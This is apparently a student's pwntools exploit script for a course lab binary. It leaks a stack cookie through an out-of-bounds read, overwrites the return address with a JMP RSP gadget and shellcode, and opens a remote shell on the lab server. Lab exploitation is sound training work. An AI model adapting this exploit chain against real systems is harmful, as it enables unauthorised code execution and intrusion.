from pwn import *

context.arch="x86_64"                           # Set the architecture to x86_64

''' Define Constants '''
JMP_RSP = 0x00401400                           # Set JMP RSP Address
SHELLCODE = asm(shellcraft.amd64.linux.sh())    # Generate shellcode

p = remote("csc748.hostbin.org", 7031)      # Test Script Against Server
#p = process("./3-1_lab.bin")  # Test Script Locally
#p = gdb.debug("./3-1_lab.bin")

# place input for program
p.sendline(b'3') #select option (3) Price check
p.sendline(b'7') #initiate Out-of-bounds array access

#
# Step 1: use hexdump to find cookie location
#
#print(hexdump(p.read(1500)))

#
# Step 2: leak cookie location
#
p.readuntil(b'price: ')		# Wait for program output
cookie_dec = p.readuntil(b'\n')

#handle negatives by converting to signed 2s complment
cookie_int = int(cookie_dec.strip())
cookie_hex = format(cookie_int & 0xFFFFFFFFFFFFFFFF, '016x')

# Convert the hexadecimal string back to an integer
cookie_hex_int = int(cookie_hex, 16)
print(f"Cookie: 0x{cookie_hex} ({cookie_hex_int})")


#
# Step 3: prepare payload and overwrite the stack
#

p.sendline(b'2') #select option (2) Change restaurant name

#payload format (buffer + cookie + rbp + return address)
payload = b"A"*24 + p64(cookie_hex_int) + b"B"*8 + p64(JMP_RSP) + SHELLCODE
p.sendline(payload)       # Send the payload


#
# Step 4: trigger program exit to force return address usage
#

p.sendline(b"4")       # select option (4) exit

# Start Interactive Session
p.interactive()
